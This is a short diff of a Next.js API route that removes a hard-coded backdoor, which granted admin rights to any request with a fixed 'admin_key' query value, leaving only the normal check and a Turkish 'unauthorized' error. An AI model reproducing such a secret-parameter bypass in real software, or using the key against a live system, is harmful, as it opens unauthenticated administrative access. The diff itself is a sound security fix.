@@ -204,12 +204,6 @@ export async function GET(req: NextRequest) {
       }
     }
 
-    // In dev or local mode, allow verified root parameter
-    const adminParam = req.nextUrl.searchParams.get("admin_key");
-    if (adminParam === "sbgok57_root_authorized") {
-      isAdmin = true;
-    }
-
     if (!isAdmin) {
       return NextResponse.json(
         { ok: false, error: "Yetkisiz Erişim: Bu alana yalnızca Kurucu Yönetici (sbgok57) erişebilir." },
